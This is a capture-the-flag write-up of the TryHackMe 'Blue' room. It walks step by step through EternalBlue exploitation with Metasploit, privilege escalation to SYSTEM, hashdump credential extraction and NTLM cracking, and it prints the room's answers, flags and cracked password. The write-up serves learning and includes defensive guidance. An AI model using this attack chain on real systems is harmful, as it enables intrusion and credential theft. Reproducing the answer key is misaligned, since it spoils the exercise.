# TryHackMe: Blue

## Executive Summary

Blue is one of the most well-known beginner-friendly Windows exploitation rooms on TryHackMe. The room focuses on identifying and exploiting the infamous MS17-010 vulnerability, commonly known as EternalBlue, which affected SMBv1 on Windows systems.

During this room, a complete attack chain was performed against a vulnerable Windows target:

```text
Reconnaissance
      ↓
Service Enumeration
      ↓
Vulnerability Discovery
      ↓
EternalBlue Exploitation
      ↓
Initial Shell Access
      ↓
Meterpreter Upgrade
      ↓
Privilege Escalation
      ↓
Credential Dumping
      ↓
Password Cracking
      ↓
Data Discovery
```

This room provides an excellent introduction to real-world Windows penetration testing concepts including SMB enumeration, Metasploit exploitation, privilege escalation, credential access, and post-exploitation techniques.

---

# Learning Objectives

By completing this room, I learned how to:

* Perform reconnaissance using Nmap.
* Enumerate SMB services.
* Detect vulnerabilities using Nmap NSE scripts.
* Identify systems vulnerable to MS17-010.
* Exploit EternalBlue using Metasploit.
* Understand the difference between a standard shell and Meterpreter.
* Upgrade a shell into a Meterpreter session.
* Escalate privileges to NT AUTHORITY\SYSTEM.
* Dump Windows password hashes.
* Crack NTLM password hashes.
* Locate sensitive files and valuable data within a Windows system.
* Understand the complete Windows attack lifecycle from initial access to post-exploitation.

---

# Room Information

| Category         | Value                                                        |
| ---------------- | ------------------------------------------------------------ |
| Platform         | TryHackMe                                                    |
| Room Name        | Blue                                                         |
| Difficulty       | Easy                                                         |
| Operating System | Windows                                                      |
| Vulnerability    | MS17-010 (EternalBlue)                                       |
| Tools Used       | Nmap, Metasploit, Meterpreter, John the Ripper, CrackStation |
| Focus Area       | Windows Exploitation & Post-Exploitation                     |

---

# Prerequisites

Before attempting this room, it is recommended to have a basic understanding of:

* TCP/IP Networking
* Windows Fundamentals
* Linux Command Line
* Nmap Basics
* Metasploit Basics
* SMB Protocol Fundamentals

---

# Technologies and Protocols Covered

## SMB (Server Message Block)

SMB is a network protocol used by Windows systems for:

* File sharing
* Printer sharing
* Remote administration
* Inter-process communication

Default ports:

```text
TCP/445
TCP/139
```

Because SMB often exposes sensitive services and legacy components, it is one of the most frequently targeted protocols during Windows penetration tests.

---

## MS17-010

MS17-010 is a Microsoft security bulletin that patched multiple vulnerabilities affecting SMBv1.

These vulnerabilities allowed remote attackers to execute arbitrary code without authentication.

Impact:

```text
Remote Code Execution
```

Affected systems:

* Windows 7
* Windows Server 2008
* Older Windows operating systems

---

## EternalBlue

EternalBlue is the exploit developed to weaponize the MS17-010 vulnerability.

The exploit became globally famous after being used by ransomware campaigns such as:

* WannaCry
* NotPetya

EternalBlue is considered one of the most significant Windows exploits ever discovered.

---

## Metasploit Framework

Metasploit is a penetration testing framework that provides:

* Exploits
* Payloads
* Auxiliary Modules
* Post-Exploitation Modules

Throughout this room, Metasploit was used to exploit the vulnerable SMB service and gain remote access.

---

# Lab Architecture

```text
┌─────────────────────────┐
│ Attacker Machine        │
│                         │
│ Kali Linux / AttackBox  │
│                         │
│ Nmap                    │
│ Metasploit              │
│ Meterpreter             │
└────────────┬────────────┘
             │
             │ TCP
             │
┌────────────▼────────────┐
│ Target Machine          │
│                         │
│ Windows 7              │
│ SMB Service            │
│ Port 445               │
│ Vulnerable to          │
│ MS17-010               │
└─────────────────────────┘
```

---

# Attack Methodology

The methodology followed during this room was:

```text
1. Reconnaissance
2. Enumeration
3. Vulnerability Identification
4. Exploitation
5. Post-Exploitation
6. Credential Access
7. Password Cracking
8. Data Discovery
```

Understanding this workflow is more important than simply obtaining the flags because the same methodology appears repeatedly in real-world penetration testing engagements.

---

# Phase 1 - Reconnaissance

## Objective

The first goal was to identify:

* Open ports
* Running services
* Potential vulnerabilities

---

# Nmap Scan

The following command was used:

```bash
nmap -sV -sC --script vuln -oN nmap <TARGET_IP>
```

Example:

```bash
nmap -sV -sC --script vuln -oN nmap 10.10.10.10
```

---

# Command Breakdown

## nmap

Network Mapper.

Used to:

* Discover hosts
* Identify open ports
* Enumerate services
* Detect vulnerabilities

---

## -sV

### Purpose

Service Version Detection.

### Example

Without:

```text
445/tcp open microsoft-ds
```

With:

```text
445/tcp open microsoft-ds Windows 7 Professional
```

This provides additional information that may help identify vulnerabilities.

---

## -sC

### Purpose

Runs Nmap's default NSE (Nmap Scripting Engine) scripts.

These scripts gather additional information such as:

* Service information
* SMB details
* HTTP titles
* SSL information

---

## --script vuln

### Purpose

Runs vulnerability detection scripts.

Examples include:

```text
smb-vuln-ms17-010
smb-vuln-ms08-067
```

This option was critical for identifying the vulnerability used later in the room.

---

## -oN nmap

### Purpose

Saves scan results into a file.

Output file:

```text
nmap
```

Maintaining scan results is considered good penetration testing practice because it allows later analysis without rerunning scans.

---

# Scan Results

Important results:

```text
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

---

# Analysis of Open Ports

## Port 135 - MSRPC

### Service

Microsoft Remote Procedure Call.

### Purpose

Allows communication between processes and services within Windows environments.

### Pentesting Relevance

Can reveal:

* System information
* RPC services
* Potential attack surface

---

## Port 139 - NetBIOS Session Service

### Service

NetBIOS over TCP/IP.

### Purpose

Legacy Windows networking communication.

### Pentesting Relevance

Can expose:

* Shared resources
* Hostnames
* User information

---

## Port 445 - SMB

### Service

Microsoft Directory Services.

### Purpose

Primary SMB communication port.

### Pentesting Relevance

One of the most valuable ports in Windows environments.

Common attacks include:

* EternalBlue
* SMB Relay
* Pass-the-Hash
* SMB Enumeration

Whenever TCP/445 is discovered during a penetration test, it should receive immediate attention.

---

# Question 1

## How many ports are open with a port number under 1000?

Open ports:

```text
135
139
445
```

Count:

```text
3
```

### Answer

```text
3
```

---

# Vulnerability Discovery

The Nmap vulnerability scan revealed:

```text
Host is likely VULNERABLE to MS17-010
```

or:

```text
smb-vuln-ms17-010:
VULNERABLE
```

This immediately indicated that the target was susceptible to EternalBlue exploitation.

---

# Understanding MS17-010

MS17-010 affects SMBv1.

Simplified attack flow:

```text
Attacker
      ↓
Crafted SMB Packets
      ↓
Memory Corruption
      ↓
Remote Code Execution
      ↓
System Compromise
```

No valid credentials are required.

This makes the vulnerability extremely dangerous.

---

# Why MS17-010 Matters

The vulnerability gained worldwide attention after being abused by ransomware campaigns including WannaCry.

Organizations around the world experienced:

* Service outages
* Data loss
* Financial damage

This event demonstrated the importance of timely patch management.

---

# Question 2

## What is this machine vulnerable to?

Based on the vulnerability scan:

```text
MS17-010
```

### Answer

```text
ms17-010
```

---

# Red Team Perspective

From an attacker's perspective:

```text
Port 445 Open
        ↓
SMB Enumeration
        ↓
MS17-010 Discovery
        ↓
EternalBlue Exploitation
```

This provides a direct path toward remote code execution.

---

# Blue Team Perspective

Defenders should:

* Disable SMBv1 whenever possible.
* Apply Microsoft security updates.
* Monitor SMB traffic.
* Restrict unnecessary access to TCP/445.
* Detect exploitation attempts through IDS/IPS solutions.

---

# Key Takeaways

* Nmap can perform service detection and vulnerability identification simultaneously.
* SMB is one of the most important protocols to investigate during Windows assessments.
* MS17-010 remains one of the most famous Windows vulnerabilities.
* Proper enumeration often reveals the most effective attack path.
* Reconnaissance is the foundation of successful exploitation.

---

# Skills Gained (Part 1)

* Nmap Scanning
* Service Enumeration
* SMB Enumeration
* Vulnerability Identification
* NSE Script Usage
* Understanding MS17-010
* Understanding EternalBlue
* Windows Reconnaissance Methodology

---

# Part 2 - Exploitation and Initial Access

---

# Exploitation Phase Overview

During the reconnaissance phase, the following information was discovered:

```text
Target Operating System: Windows 7
Open Service: SMB
Port: 445/TCP
Vulnerability: MS17-010
```

At this point, the attack surface had been identified and the next objective was to obtain remote access to the target machine.

The attack path for this phase was:

```text
MS17-010 Discovery
        ↓
EternalBlue Exploitation
        ↓
Reverse Shell
        ↓
Meterpreter Upgrade
        ↓
Privilege Escalation
        ↓
SYSTEM Access
```

---

# What is Exploitation?

Exploitation is the process of leveraging a vulnerability to execute code on a target system.

In this room:

```text
Vulnerability:
MS17-010

Exploit:
EternalBlue
```

Goal:

```text
Remote Code Execution (RCE)
```

Successfully exploiting the vulnerability allows an attacker to execute commands remotely without possessing valid credentials.

---

# Starting Metasploit

The Metasploit Framework was used to exploit the vulnerable SMB service.

Command:

```bash
msfconsole
```

---

# Purpose

Launches the Metasploit Framework console.

---

# Example Output

```text
msf6 >
```

This indicates that Metasploit is ready to accept commands.

---

# Searching for the Exploit

Command:

```bash
search ms17-010
```

---

# Purpose

Searches Metasploit's module database for modules related to MS17-010.

---

# Example Output

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

# Question

## Find the exploitation code we will run against the machine.

### Answer

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

# Understanding EternalBlue

EternalBlue exploits a flaw in SMBv1 by sending specially crafted packets to the target.

Simplified attack flow:

```text
Attacker
     ↓
Crafted SMB Request
     ↓
Memory Corruption
     ↓
Code Execution
     ↓
Shell Access
```

---

# Why EternalBlue Is So Dangerous

Unlike many vulnerabilities that require authentication, EternalBlue can be exploited remotely without valid credentials.

This means:

```text
Username Required? No
Password Required? No
User Interaction Required? No
```

The attacker only needs network access to the SMB service.

---

# Loading the Exploit

Command:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

# Purpose

Loads the EternalBlue exploit module into Metasploit.

---

# Checking Module Options

Command:

```bash
show options
```

---

# Purpose

Displays all required and optional parameters for the exploit.

---

# Example Output

```text
Name      Current Setting
----      ---------------
RHOSTS
RPORT     445
```

---

# Understanding RHOSTS

## What is RHOSTS?

```text
Remote Hosts
```

Specifies the target machine that will be attacked.

---

# Why Is It Required?

The exploit needs to know where to send the malicious SMB packets.

Without a target:

```text
Exploit
     ↓
No Destination
     ↓
Cannot Execute
```

---

# Question

## Show options and set the one required value. What is the name of this value?

### Answer

```text
RHOSTS
```

---

# Setting the Target

Command:

```bash
set RHOSTS <TARGET_IP>
```

Example:

```bash
set RHOSTS 10.10.10.10
```

---

# Understanding Payloads

Before running the exploit, the room instructs us to change the payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

---

# What is a Payload?

Many beginners confuse exploits and payloads.

They are different components.

---

## Exploit

Responsible for triggering the vulnerability.

---

## Payload

Responsible for what happens after exploitation succeeds.

---

# Analogy

```text
Exploit = Unlocking the door

Payload = Walking through the door
```

---

# Understanding the Selected Payload

Payload:

```text
windows/x64/shell/reverse_tcp
```

Breakdown:

### windows

Target operating system.

---

### x64

64-bit architecture.

---

### shell

Provides a command shell.

---

### reverse_tcp

The target initiates a connection back to the attacker.

---

# Why Reverse Shells Are Popular

Normal communication:

```text
Attacker → Target
```

Reverse shell:

```text
Target → Attacker
```

This often works better because outbound connections are usually allowed through firewalls.

---

# Executing the Exploit

Command:

```bash
run
```

or

```bash
exploit
```

---

# Behind the Scenes

Simplified exploitation flow:

```text
Attacker
      ↓
Port 445
      ↓
MS17-010 Triggered
      ↓
Kernel Memory Corruption
      ↓
Payload Execution
      ↓
Reverse Shell
```

---

# Successful Exploitation

Successful exploitation typically produces output similar to:

```text
Command shell session opened
```

---

# Common Issue

Sometimes the shell session opens successfully but no prompt appears.

Solution:

```text
Press ENTER
```

The command prompt usually appears immediately afterward.

---

# Initial Access Achieved

At this stage, a basic Windows shell has been obtained:

```text
C:\Windows\system32>
```

While useful, this shell is limited compared to Meterpreter.

---

# Shell vs Meterpreter

## Standard Shell

Provides access to basic Windows commands:

```cmd
dir
whoami
ipconfig
cd
```

---

# Limitations

A standard shell lacks advanced post-exploitation capabilities.

Examples:

```text
No hashdump
No getsystem
No migrate
No process management
```

---

## Meterpreter

Meterpreter is a specialized Metasploit payload designed for post-exploitation.

Capabilities include:

```text
Privilege Escalation
Credential Dumping
Process Migration
File Upload
File Download
System Enumeration
```

---

# Why Upgrade to Meterpreter?

Goal:

```text
Basic Shell
       ↓
Advanced Post-Exploitation Session
```

---

# Backgrounding the Shell

Before upgrading:

```text
CTRL + Z
```

Answer:

```text
y
```

This backgrounds the current session and returns to the Metasploit console.

---

# Method 1 - Educational Approach

The room introduces the Meterpreter upgrade process using a post-exploitation module.

Module:

```text
post/multi/manage/shell_to_meterpreter
```

---

# Loading the Module

Command:

```bash
use post/multi/manage/shell_to_meterpreter
```

---

# Viewing Options

Command:

```bash
show options
```

---

# Question

## What option are we required to change?

### Answer

```text
SESSION
```

---

# Understanding SESSION

Metasploit can manage multiple active connections.

Example:

```text
Session 1
Session 2
Session 3
```

The SESSION parameter tells Metasploit which shell should be upgraded.

---

# Listing Sessions

Command:

```bash
sessions
```

---

# Example Output

```text
1 shell
```

---

# Setting the Session

Command:

```bash
set SESSION 1
```

---

# Running the Module

Command:

```bash
run
```

---

# Successful Upgrade

Example output:

```text
Meterpreter session 2 opened
```

A new Meterpreter session is created while the original shell remains available.

---

# Method 2 - Practical Shortcut

During exploitation, a faster method was used:

```bash
sessions -u 1
```

---

# Why It Works

This command automatically performs the upgrade process.

Internally, Metasploit executes:

```text
post/multi/manage/shell_to_meterpreter
```

using the specified session.

---

# Comparison

Manual Method:

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

Shortcut:

```bash
sessions -u 1
```

Both achieve the same result.

---

# Pentester Perspective

In real-world engagements, operators commonly use:

```bash
sessions -u <session_id>
```

because it is faster and more efficient.

---

# Interacting with Meterpreter

After upgrading:

```bash
sessions
```

Example:

```text
1 shell
2 meterpreter
```

Connect to the Meterpreter session:

```bash
sessions -i 2
```

---

# Meterpreter Prompt

Example:

```text
meterpreter >
```

---

# Useful Meterpreter Commands

Display system information:

```bash
sysinfo
```

---

Display current user:

```bash
getuid
```

---

List processes:

```bash
ps
```

---

Drop into a Windows shell:

```bash
shell
```

---

# Privilege Escalation

Obtaining a Meterpreter session does not automatically guarantee the highest level of access.

The next objective is to obtain:

```text
NT AUTHORITY\SYSTEM
```

---

# What is SYSTEM?

Windows privilege hierarchy:

```text
User
    ↓
Administrator
    ↓
NT AUTHORITY\SYSTEM
```

SYSTEM is the most privileged account on a Windows system.

Linux equivalent:

```text
root
```

---

# Checking Current Identity

Command:

```bash
getuid
```

---

# Escalating Privileges

Command:

```bash
getsystem
```

---

# Purpose

Attempts several local privilege escalation techniques to obtain SYSTEM privileges.

---

# Verifying Success

Command:

```bash
getuid
```

Expected result:

```text
NT AUTHORITY\SYSTEM
```

---

Alternative verification:

```bash
shell
```

Then:

```cmd
whoami
```

Output:

```text
nt authority\system
```

---

# Why SYSTEM Matters

SYSTEM access allows:

* Reading protected files
* Accessing the SAM database
* Dumping password hashes
* Migrating into privileged processes
* Full system control

Most post-exploitation activities require this level of access.

---

# Red Team Perspective

From an attacker's perspective:

```text
Remote Code Execution
       ↓
Meterpreter Session
       ↓
SYSTEM Privileges
       ↓
Credential Access
```

Obtaining SYSTEM is often the gateway to credential theft and further compromise.

---

# Blue Team Perspective

Indicators of compromise include:

* Unexpected Meterpreter activity
* Privilege escalation events
* Unusual process creation
* Reverse shell connections
* Suspicious SMB activity

Detection opportunities exist throughout the exploitation chain.

---

# Key Takeaways

* Metasploit can quickly weaponize known vulnerabilities.
* EternalBlue allows unauthenticated remote code execution.
* Exploits and payloads serve different purposes.
* Meterpreter provides significantly more functionality than a standard shell.
* SYSTEM privileges represent the highest level of access on Windows.
* Upgrading and stabilizing access is a critical post-exploitation step.

---

# Skills Gained (Part 2)

* Metasploit Fundamentals
* EternalBlue Exploitation
* Payload Configuration
* Reverse Shell Concepts
* Session Management
* Shell Upgrading
* Meterpreter Usage
* Privilege Escalation
* Understanding SYSTEM Privileges

---

# Part 3 - Post-Exploitation, Credential Access, and Password Cracking

---

# Post-Exploitation Overview

At the end of Part 2, the target machine had been successfully compromised and a Meterpreter session was obtained.

Current position:

```text
MS17-010 Exploitation
        ↓
Meterpreter Access
        ↓
NT AUTHORITY\SYSTEM
```

At this stage, the objective is no longer gaining access.

The objective becomes:

```text
Maintaining Access
Credential Access
Privilege Verification
Data Discovery
```

This phase closely resembles what happens during a real-world post-exploitation engagement.

---

# Why Post-Exploitation Matters

Many beginners focus exclusively on exploitation.

However, exploitation is often only a small part of a penetration test.

A more realistic attack chain looks like:

```text
Initial Access
      ↓
Privilege Escalation
      ↓
Credential Access
      ↓
Persistence
      ↓
Lateral Movement
      ↓
Data Access
```

The Blue room introduces several of these concepts.

---

# Verifying SYSTEM Access

Before performing any sensitive actions, it is important to verify privileges.

Command:

```bash
getuid
```

Expected output:

```text
NT AUTHORITY\SYSTEM
```

---

# Why SYSTEM Is Important

Many Windows resources are protected from standard users.

Examples include:

* SAM Database
* Security Logs
* Registry Hives
* Protected System Files

Without SYSTEM privileges:

```text
Access Denied
```

With SYSTEM privileges:

```text
Full Control
```

---

# Process Enumeration

After obtaining SYSTEM privileges, the room asks us to inspect running processes.

Command:

```bash
ps
```

---

# Purpose

Displays currently running processes.

Example:

```text
PID     Name            User
---------------------------------------
700     svchost.exe     NT AUTHORITY\SYSTEM
888     lsass.exe       NT AUTHORITY\SYSTEM
1320    explorer.exe    Jon
```

---

# Why Enumerate Processes?

Understanding running processes helps identify:

* User activity
* Security software
* Migration targets
* Potential persistence opportunities

Process enumeration is one of the first activities performed after gaining access.

---

# Process Migration

The room requires migrating into a SYSTEM process.

Command:

```bash
migrate <PID>
```

Example:

```bash
migrate 700
```

---

# What Is Process Migration?

Meterpreter initially runs inside a process created during exploitation.

If that process terminates:

```text
Meterpreter dies
```

Migration moves the Meterpreter session into another process.

---

# Why Migrate?

Benefits include:

```text
Improved Stability
Reduced Risk of Session Loss
Longer-Lived Access
```

---

# Typical Migration Targets

Common targets include:

```text
svchost.exe
services.exe
spoolsv.exe
```

These processes usually remain active for long periods.

---

# Successful Migration

Expected output:

```text
Migration completed successfully.
```

---

# Credential Access

With SYSTEM privileges and a stable Meterpreter session established, the next objective is credential extraction.

---

# Windows Password Storage

Windows does not store passwords in plaintext.

Instead, it stores password hashes.

These hashes are primarily located within the:

```text
Security Account Manager (SAM)
```

Database.

---

# What Is SAM?

SAM stands for:

```text
Security Account Manager
```

Location:

```text
C:\Windows\System32\config\SAM
```

---

# Purpose of SAM

Stores:

* User Accounts
* Password Hashes
* Security Information

---

# Why Attackers Target SAM

The SAM database often contains:

```text
Administrator Hashes
User Hashes
Service Account Hashes
```

These hashes can later be:

```text
Cracked
Reused
Leveraged for Lateral Movement
```

---

# Dumping Password Hashes

Meterpreter command:

```bash
hashdump
```

---

# Purpose

Extracts password hashes from the target system.

Requires elevated privileges.

---

# Example Output

```text
Administrator:500:aad3b435...:31d6cfe0...
Guest:501:aad3b435...:31d6cfe0...
Jon:1000:aad3b435...:f4ff64...
```

---

# Understanding Hashdump Output

Format:

```text
Username:RID:LM Hash:NTLM Hash
```

Example:

```text
Jon:1000:aad3...:f4ff...
```

Components:

### Username

Account name.

---

### RID

Relative Identifier.

Windows account identifier.

---

### LM Hash

Legacy Windows hash format.

Usually disabled on modern systems.

---

### NTLM Hash

Primary target for password cracking.

---

# Question

## What is the name of the non-default user?

From the hashdump output:

```text
Jon
```

---

# Answer

```text
Jon
```

---

# Understanding NTLM

NTLM stands for:

```text
NT LAN Manager
```

Windows stores:

```text
NTLM(password)
```

instead of:

```text
Plaintext Password
```

---

# Why Hashes Are Used

Hashes provide:

```text
One-Way Transformation
```

Meaning:

```text
Password
      ↓
Hash
```

But not:

```text
Hash
      ↓
Password
```

directly.

---

# Password Cracking

After obtaining Jon's NTLM hash, the next objective is recovering the original password.

---

# Method 1 - John the Ripper

The traditional approach is using John the Ripper.

Example:

```bash
john --format=NT hash.txt
```

---

# Using a Wordlist

Example:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
```

---

# Command Breakdown

## john

Launches John the Ripper.

---

## --wordlist

Specifies a password list.

---

## --format=NT

Indicates that the hash is NTLM.

---

## hash.txt

File containing the hash.

---

# How John Works

Process:

```text
Wordlist Entry
       ↓
Generate NTLM Hash
       ↓
Compare Against Target Hash
       ↓
Match Found?
```

If a match is found:

```text
Password Recovered
```

---

# Viewing Cracked Passwords

Command:

```bash
john --show hash.txt
```

Example:

```text
Jon:alqfna22
```

---

# Method 2 - CrackStation

During this room, CrackStation was used instead of John the Ripper.

Website:

```text
https://crackstation.net
```

---

# Why CrackStation Worked

CrackStation maintains a massive database of previously cracked hashes.

Instead of brute-forcing:

```text
Hash
      ↓
Database Lookup
      ↓
Password Found
```

---

# Difference Between John and CrackStation

## John

```text
Hash
      ↓
Wordlist Attack
      ↓
Crack Password
```

Advantages:

* Offline
* Professional workflow
* Works on unknown hashes

---

## CrackStation

```text
Hash
      ↓
Database Search
      ↓
Immediate Result
```

Advantages:

* Extremely fast
* Beginner friendly

Limitations:

* Requires the hash to already exist in the database

---

# Question

## What is the cracked password?

Recovered password:

```text
alqfna22
```

---

# Answer

```text
alqfna22
```

---

# Professional Pentesting Considerations

In real-world assessments:

```text
Hashdump
      ↓
Export Hashes
      ↓
Offline Cracking
```

is generally preferred.

Uploading client hashes to third-party websites may violate engagement rules or operational security requirements.

Tools commonly used include:

* Hashcat
* John the Ripper
* Hydra
* Custom cracking infrastructure

---

# Red Team Perspective

Credential dumping provides opportunities for:

```text
Password Recovery
Pass-the-Hash
Credential Reuse
Privilege Escalation
Lateral Movement
```

In many environments, obtaining one user's password can lead to access across multiple systems.

---

# Blue Team Perspective

Defenders should monitor for:

* SAM access
* LSASS access
* Credential dumping activity
* Suspicious Meterpreter behavior
* Privilege escalation attempts

Mitigations include:

* Credential Guard
* Strong password policies
* Least privilege
* Endpoint Detection and Response (EDR)

---

# Detection Opportunities

Security teams may detect:

```text
Meterpreter Sessions
Hashdump Activity
Unauthorized SAM Access
Privilege Escalation Events
```

through:

* Windows Event Logs
* EDR Platforms
* SIEM Solutions
* Behavioral Analytics

---

# Key Takeaways

* SYSTEM privileges enable access to protected Windows resources.
* Process migration improves session stability.
* The SAM database contains valuable credential information.
* Password hashes can be extracted and cracked offline.
* NTLM remains a common target during Windows assessments.
* Credential access is often more valuable than initial exploitation.

---

# Skills Gained (Part 3)

* Process Enumeration
* Process Migration
* Credential Dumping
* SAM Database Analysis
* NTLM Hash Identification
* Password Cracking
* John the Ripper Usage
* CrackStation Usage
* Post-Exploitation Methodology

---

# Part 4 - Flag Discovery, Windows Looting, Lessons Learned, and Conclusion

---

# Flag Discovery Overview

The final task in the Blue room involves locating three flags placed throughout the Windows system.

Unlike traditional Capture The Flag (CTF) challenges, these flags are designed to introduce important Windows locations that attackers commonly target after compromising a system.

The flags represent three key post-exploitation objectives:

```text id="4sl7l4"
Flag 1 → System Access
Flag 2 → Credential Access
Flag 3 → Data Discovery
```

While the room encourages exploring these locations manually, an alternative approach using Meterpreter's search functionality was also used during this engagement.

---

# Traditional Approach vs Practical Approach

## Traditional Approach

The room encourages participants to manually browse important Windows directories:

```text id="a6x5sm"
C:\
C:\Windows\System32\config
C:\Users\Administrator
```

This approach helps beginners learn the Windows filesystem structure.

---

## Practical Approach

Since SYSTEM privileges had already been obtained, manually traversing directories was unnecessary.

Instead, Meterpreter's file search functionality was used:

```bash id="l4z09g"
search -f flag*
```

---

# Why This Works

At this stage of the attack:

```text id="chv7zq"
SYSTEM Access
        ↓
Full Filesystem Visibility
        ↓
Search Entire System
```

Rather than manually checking folders one by one, searching for the filenames immediately reveals their locations.

This approach more closely resembles how an operator would work during a real-world engagement.

---

# Flag 1 - System Root

## Hint

```text id="0l7uxj"
This flag can be found at the system root.
```

---

# Understanding the System Root

The system root refers to the primary drive where Windows is installed.

Common examples:

```text id="x1n7v5"
C:\
```

or

```text id="sqvpc2"
C:\Windows
```

---

# Locating the Flag

Using Meterpreter:

```bash id="f3z69v"
search -f flag1.txt
```

Example result:

```text id="xmpn5r"
c:\flag1.txt
```

---

# Reading the Flag

Command:

```bash id="xzv2md"
cat c:\\flag1.txt
```

---

# Flag 1

```text id="j2z2nd"
flag{access_the_machine}
```

---

# Why This Location Matters

This flag symbolizes the first milestone after exploitation:

```text id="h0g7s4"
Successful System Access
```

The attacker has successfully gained control of the machine.

---

# Flag 2 - Credential Storage

## Hint

```text id="x7r8ya"
This flag can be found at the location where passwords are stored within Windows.
```

---

# Understanding Credential Storage

Earlier in the room, password hashes were extracted using:

```bash id="4gh7xe"
hashdump
```

The source of those hashes is the Security Account Manager (SAM) database.

Location:

```text id="f0h4yi"
C:\Windows\System32\config
```

---

# Why SAM Is Important

The SAM database contains:

```text id="2grf05"
User Accounts
Password Hashes
Security Information
```

It is one of the most valuable locations on a compromised Windows machine.

---

# Locating the Flag

Command:

```bash id="uws7t5"
search -f flag2.txt
```

Example result:

```text id="brwlj5"
c:\Windows\System32\config\flag2.txt
```

---

# Reading the Flag

Command:

```bash id="8ztxpj"
cat c:\\Windows\\System32\\config\\flag2.txt
```

---

# Flag 2

```text id="c0g2ke"
flag{sam_database_elevated_access}
```

---

# Why This Flag Matters

This flag represents:

```text id="u0s2vi"
Credential Access
```

One of the most important goals during post-exploitation.

Obtaining password hashes often enables:

* Password cracking
* Privilege escalation
* Lateral movement
* Domain compromise

---

# Flag 3 - Administrator Documents

## Hint

```text id="ly5u0w"
Administrators usually have pretty interesting things saved.
```

---

# Understanding Data Discovery

After obtaining access and credentials, attackers often search for sensitive information.

This process is commonly called:

```text id="2cx7ux"
Looting
```

or

```text id="yq1lfd"
Data Discovery
```

---

# Common Locations to Investigate

Examples:

```text id="r0k7n4"
Desktop
Documents
Downloads
Shared Folders
Network Shares
```

---

# Why Administrator Profiles Matter

Administrator accounts frequently contain:

```text id="wgjdzx"
Configuration Files
Passwords
Private Keys
VPN Information
Internal Documentation
```

These files can be more valuable than the exploit itself.

---

# Locating the Flag

Command:

```bash id="u7wq9r"
search -f flag3.txt
```

Example result:

```text id="aw8z4w"
c:\Users\Administrator\Documents\flag3.txt
```

---

# Reading the Flag

Command:

```bash id="r4sl4o"
cat c:\\Users\\Administrator\\Documents\\flag3.txt
```

---

# Flag 3

```text id="ah6k3z"
flag{admin_documents_can_be_valuable}
```

---

# Why This Flag Matters

This flag represents:

```text id="rh5lzi"
Data Discovery
```

Many real-world compromises are successful because administrators store sensitive information in accessible locations.

Examples include:

```text id="2czq4s"
passwords.xlsx
vpn.txt
credentials.docx
private_key.pem
```

Attackers routinely search for these files after gaining access.

---

# Red Team Perspective

The complete attack chain performed during this room resembles a realistic penetration testing workflow:

```text id="0z63e4"
Reconnaissance
        ↓
Enumeration
        ↓
Vulnerability Discovery
        ↓
Exploitation
        ↓
Privilege Escalation
        ↓
Credential Access
        ↓
Data Discovery
```

Each stage provides opportunities to advance further into the target environment.

---

# Blue Team Perspective

Defenders should focus on disrupting this chain as early as possible.

Examples:

## Reconnaissance

Monitor scanning activity.

---

## Exploitation

Patch vulnerable services.

---

## Privilege Escalation

Detect unusual privilege changes.

---

## Credential Access

Protect credentials using:

* Credential Guard
* EDR Solutions
* Strong Password Policies

---

## Data Discovery

Monitor unusual file access behavior.

---

# MITRE ATT&CK Mapping

| Tactic               | Technique                             |
| -------------------- | ------------------------------------- |
| Reconnaissance       | Active Scanning                       |
| Initial Access       | Exploit Public-Facing Service         |
| Execution            | Command and Scripting Interpreter     |
| Privilege Escalation | Exploitation for Privilege Escalation |
| Credential Access    | OS Credential Dumping                 |
| Discovery            | System Information Discovery          |
| Discovery            | File and Directory Discovery          |
| Collection           | Data from Local System                |

---

# Troubleshooting Notes

## Shell Does Not Appear

After exploitation:

```text id="vclxyh"
Press ENTER
```

The shell may already be active but not displaying a prompt.

---

## Meterpreter Upgrade Fails

Retry:

```bash id="8s5n8m"
sessions -u <session_id>
```

or rerun the shell_to_meterpreter module.

---

## Migration Fails

Choose a different SYSTEM process.

Examples:

```text id="96o5yj"
svchost.exe
services.exe
spoolsv.exe
```

---

## Flag Not Found

The room notes that Windows may occasionally remove Flag 2.

If necessary:

```text id="e0whcn"
Restart Target
Re-exploit
Repeat Search
```

---

# Lessons Learned

This room demonstrates that exploitation is only one part of a successful attack.

The full workflow includes:

```text id="8o2uk4"
Reconnaissance
        ↓
Exploitation
        ↓
Access
        ↓
Privilege Escalation
        ↓
Credential Access
        ↓
Data Discovery
```

Understanding the relationship between these phases is more valuable than simply obtaining the flags.

---

# Skills Gained

## Reconnaissance

* Nmap Scanning
* Service Enumeration
* Vulnerability Identification

---

## Exploitation

* EternalBlue
* Metasploit
* Payload Configuration

---

## Post-Exploitation

* Meterpreter
* Process Migration
* Privilege Escalation

---

## Credential Access

* Hashdump
* NTLM Hashes
* SAM Database

---

## Password Cracking

* John the Ripper
* Online Hash Lookup
* Password Recovery Techniques

---

## Data Discovery

* Windows Filesystem Enumeration
* Sensitive File Discovery
* Administrator Profile Investigation

---

# Key Takeaways

* TCP/445 is one of the most valuable ports during Windows assessments.
* MS17-010 remains one of the most impactful Windows vulnerabilities ever discovered.
* Meterpreter significantly enhances post-exploitation capabilities.
* SYSTEM privileges provide access to highly sensitive resources.
* Credential dumping is often more valuable than initial access.
* Data stored by administrators can be a major source of compromise.
* Successful penetration testing relies on a structured methodology rather than isolated exploits.

---

# Conclusion

Blue is an excellent introductory Windows exploitation room that demonstrates a complete attack lifecycle from reconnaissance to post-exploitation.

The room introduces several foundational concepts that continue to appear in more advanced environments, including:

* Active Directory
* Windows Privilege Escalation
* Credential Theft
* Lateral Movement
* Red Team Operations

Mastering the concepts presented in Blue provides a strong foundation for progressing into more advanced Windows and Active Directory penetration testing labs.

---

# Future Learning Path

Recommended rooms after Blue:

1. Ice
2. Blaster
3. Windows Privilege Escalation
4. Active Directory Basics
5. Attacktive Directory
6. Wreath
7. Throwback

These rooms build upon the same concepts introduced here while introducing increasingly realistic enterprise attack scenarios.




